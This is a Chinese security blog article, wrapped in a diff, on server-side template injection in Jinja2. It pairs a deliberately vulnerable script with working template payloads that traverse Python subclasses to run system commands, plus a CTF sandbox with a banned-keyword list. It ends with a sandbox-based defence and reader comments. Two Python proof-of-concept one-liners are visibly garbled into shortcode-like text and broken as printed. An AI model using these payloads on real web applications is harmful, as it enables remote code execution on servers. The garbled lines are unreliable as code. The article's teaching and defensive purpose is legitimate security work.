@@ -1,0 +1,76 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">利用 Python 特性在 Jinja2 模板中执行任意代码</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">RickGray</a> <span class="bull">·</span> <time title="2016/02/25 14:45" ui-time="" datetime="2016/02/25 14:45" class="published ng-binding ng-isolate-scope">2016/02/25 14:45</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 简介</h1><hr><p>本文源于老外 <a href="https://twitter.com/nvisium">@nvisium</a> 在其博客发表的博文 <a href="https://nvisium.com/blog/2015/12/07/injecting-flask/">《Injecting Flask》</a>，在原文中作者讲解了 Python 模板引擎 <a href="http://jinja.pocoo.org/">Jinja2</a> 在服务端模板注入 (SSTI) 中的具体利用方法，在能够控制模板内容时利用环境变量中已注册的用户自定义函数进行恶意调用或利用渲染进行 XSS 等。</p><p>对于 Jinja2 模板引擎是否能够在 SSTI 的情况下直接执行命令原文并没有做出说明，并且在 Jinja2 官方文档中也有说明，模板中并不能够直接执行任意 Python 代码，这样看来在 Jinja2 中直接控制模板内容来执行 Python 代码或者命令似乎不太可能。</p><h1>0x01 模板中复杂的代码执行方式</h1><hr><p>最近在进行项目开发时无意中注意到 Jinja2 模板中可以访问一些 Python 内置变量，如 <code>[]</code> <code>{}</code> 等，并且能够使用 Python 变量类型中的一些函数，示例代码一如下：</p><pre><code>#!python
+# coding: utf-8
+import sys
+from jinja2 import Template
+
+template = Template("Your input: {}".format(sys.argv[1] if len(sys.argv) &gt; 1 else '&lt;empty&gt;'))
+print template.render()
+</code></pre><p>为了方便演示，这里直接将命令参数输入拼接为模板内容的一部分并进行渲染输出，这里我们直接输入 <code>{{ 'abcd' }}</code> 使模板直接渲染字符串变量：</p><p><img alt="" img-src="189b9c98f3a7574af4185dc9128e150e3b21deed.jpg"></p><p>当然上面说了可以在模板中直接调用变量实例的函数，如字符串变量中的 <code>upper()</code> 函数将其字符串转换为全大写形式：</p><p><img alt="" img-src="f84ff357dbde48900671426c281c9154f7855c1e.jpg"></p><p>那么如何在 Jinja2 的模板中执行 Python 代码呢？如官方的说法是需要在模板环境中注册函数才能在模板中进行调用，例如想要在模板中直接调用内置模块 <code>os</code>，即需要在模板环境中对其注册，示例代码二如下：</p><pre><code>#!python
+# coding: utf-8
+import os
+import sys
+from jinja2 import Template
+
+template = Template("Your input: {}".format(sys.argv[1] if len(sys.argv) &gt; 1 else '&lt;empty&gt;'))
+template.globals['os'] = os
+
+print template.render()
+</code></pre><p>执行代码，并传入参数 <code>{{ os.popen('echo Hello RCE').read() }}</code>，因为在模板环境中已经注册了 <code>os</code> 变量为 Python <code>os</code> 模块，所以可以直接调用模块函数来执行系统命令，这里执行额系统命令为 <code>echo Hello Command Exection</code>：</p><p><img alt="" img-src="e1aff19ac21be11e7d05daa76b908223fa675d2a.jpg"></p><p>如果使用示例代码一来执行，会得到 <code>os</code> 未定义的异常错误：</p><p><img alt="" img-src="7cdc456d00f6f1930266a2d0e1035c23b3a3511d.jpg"></p><h1>0x02 利用 Python 特性直接执行任意代码</h1><hr><p>那么，如何在未注册 <code>os</code> 模块的情况下在模板中调用 <code>popen()</code> 函数执行系统命令呢？前面已经说了，在 Jinja2 中模板能够访问 Python 中的内置变量并且可以调用对应变量类型下的方法，这一特点让我联想到了常见的 Python 沙盒环境逃逸方法，如 2014CSAW-CTF 中的一道 Python 沙盒绕过题目，环境代码如下：</p><pre><code>#!python
+#!/usr/bin/env python 
+from __future__ import print_function
+
+print("Welcome to my Python sandbox! Enter commands below!")
+
+banned = [  
+    "import",
+    "exec",
+    "eval",
+    "pickle",
+    "os",
+    "subprocess",
+    "kevin sucks",
+    "input",
+    "banned",
+    "cry sum more",
+    "sys"
+]
+
+targets = __builtins__.__dict__.keys()  
+targets.remove('raw_input')  
+targets.remove('print')  
+for x in targets:  
+    del __builtins__.__dict__[x]
+
+while 1:  
+    print("&gt;&gt;&gt;", end=' ')
+    data = raw_input()
+
+    for no in banned:
+        if no.lower() in data.lower():
+            print("No bueno")
+            break
+    else: # this means nobreak
+        exec data
+</code></pre><p>（利用 Python 特性绕过沙盒限制的详细讲解请参考 <a href="https://hexplo.it/escaping-the-csawctf-python-sandbox/">Writeup</a>），这里给出笔者改进后的 PoC：</p><pre><code>#!python
+[c 1="c" 2="in" 3="[" language="for"][/c].__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0].__init__.func_globals['linecache'].__dict__['o'+'s'].__dict__['sy'+'stem']('echo Hello SandBox')
+</code></pre><p><img alt="" img-src="2bf5149aff34597eec7d75b54f6dc68f6d778d5d.jpg"></p><p>当然通过这种方式不仅仅能够通过 <code>os</code> 模块来执行系统命令，还能进行文件读写等操作，具体的代码请自行构造。</p><p>回到如何在 Jinja2 模板中直接执行代码的问题上，因为模板中能够访问 Python 内置的变量和变量方法，并且还能通过 Jinja2 的模板语法去遍历变量，因此可以构造出如下模板 Payload 来达到和上面 PoC 一样的效果：</p><pre><code>#!python
+{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+{{ c.__init__.func_globals['linecache'].__dict__['os'].system('id') }}
+{% endif %}
+{% endfor %}
+</code></pre><p>使用该 Payload 作为示例代码二的执行参数，最终会执行系统命令 <code>id</code>：</p><p><img alt="" img-src="0053a807c5205d989642abbb63b591838ded7910.jpg"></p><p>当然除了遍历找到 <code>os</code> 模块外，还能直接找回 <code>eval</code> 函数并进行调用，这样就能够调用复杂的 Python 代码。</p><p>原始的 Python PoC 代码如下：</p><pre><code>#!python
+[a for a in [b for b in [c 1="c" 2="in" 3="[" language="for"][/c].__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0].__init__.func_globals.values() if type(b) == dict] if 'eval' in a.keys()][0]['eval']('__import__("os").popen("whoami").read()')
+</code></pre><p>在 Jinja2 中模板 Payload 如下：</p><pre><code>#!python
+{% for c in [].__class__.__base__.__subclasses__() %}
+{% if c.__name__ == 'catch_warnings' %}
+  {% for b in c.__init__.func_globals.values() %}
+  {% if b.__class__ == {}.__class__ %}
+    {% if 'eval' in b.keys() %}
+      {{ b['eval']('__import__("os").popen("id").read()') }}
+    {% endif %}
+  {% endif %}
+  {% endfor %}
+{% endif %}
+{% endfor %}
+</code></pre><p>使用该 Payload 作为示例代码二的执行参数（注意引号转义），成功执行会使用 <code>eval()</code> 函数动态载入 <code>os</code> 模块并执行命令：</p><p><img alt="" img-src="0623ba104a4dcb0856bebf5758c42ade09109a7b.jpg"></p><h1>0x03 利用途径和防御方法</h1><hr><p>SSTI（服务端模板注入）。通过 SSTI 控制 Web 应用渲染模板（基于 Jinja2）内容，可以轻易的进行远程代码（命令）执行。当然了，一切的前提都是模板内容可控，虽然这种场景并不常见，但难免会有程序员疏忽会有特殊的需求会让用户控制模板的一些内容。</p><p>在 Jinja2 模板中防止利用 Python 特性执行任意代码，可以使用 Jinja2 自带的沙盒环境 <code>jinja2.sandbox.SandboxedEnvironment</code>，Jinja2 默认沙盒环境在解析模板内容时会检查所操作的变量属性，对于未注册的变量属性访问都会抛出错误。</p><p><img alt="" img-src="e959fbd269e90501a416357afa2da773583c33de.jpg"></p><h1>0x04 参考</h1><hr><ul><li><a href="https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf">https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf</a></li><li><a href="https://nvisium.com/blog/2015/12/07/injecting-flask/">https://nvisium.com/blog/2015/12/07/injecting-flask/</a></li><li><a href="https://hexplo.it/escaping-the-csawctf-python-sandbox/">https://hexplo.it/escaping-the-csawctf-python-sandbox/</a></li></ul><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20160229102335edc9f9b0adc0d0c871c297da5deb1bee.png" style="width:200px;height:200px"></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/7710" rel="bookmark" id="re1">Python中eval带来的潜在风险</a></li><li><a href="http://drops.wooyun.org/web/7490" rel="bookmark" id="re2">python 安全编码&amp;代码审计</a></li><li><a href="http://drops.wooyun.org/tips/13683" rel="bookmark" id="re3">Exploring SSTI in Flask/Jinja2</a></li><li><a href="http://drops.wooyun.org/papers/11243" rel="bookmark" id="re4">一条Python命令引发的漏洞思考</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">咳咳咳</span> <span class="reply-time">2016-03-10 15:22:38</span></div><p></p><p>有新文章啦，赶紧来翻译啊！https://nvisium.com/blog/2016/03/09/exploring-ssti-in-flask-jinja2/</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">myhalo</span> <span class="reply-time">2016-02-28 19:56:38</span></div><p></p><p>赞~~~</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">左懒</span> <span class="reply-time">2016-02-25 23:21:01</span></div><p></p><p>卧槽，吓得我赶紧回去修改代码</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">RickGray打杂小弟</span> <span class="reply-time">2016-02-25 18:41:18</span></div><p></p><p>听说作者还有黑科技( ´◔ ‸◔&#039;) 求Share</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">无人知晓</span> <span class="reply-time">2016-02-25 16:47:54</span></div><p></p><p>big好厉害</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">吃屎长大的</span> <span class="reply-time">2016-02-25 15:09:39</span></div><p></p><p>牛</p><p></p></div></div></div></div></div></main>
